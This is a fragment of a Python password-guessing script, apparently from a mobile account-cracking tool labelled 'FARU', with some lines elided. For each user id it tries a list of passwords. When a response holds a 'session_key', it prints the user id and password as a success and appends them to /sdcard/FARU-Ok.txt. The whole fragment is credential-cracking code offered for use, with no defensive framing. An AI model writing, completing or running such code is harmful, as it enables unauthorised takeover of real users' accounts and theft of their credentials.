...
def file_subb(uid,pwx):
    global oks,loop
    sys.stdout.write(f"\r  \033[38;5;46m[FARU] {loop}|{str(len(oks))}");sys.stdout.flush()
    ...
    try:
        for ps in pwx:
            ...
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r  [FARU-OK] {uid} | {ps}      ")
                open("/sdcard/FARU-Ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
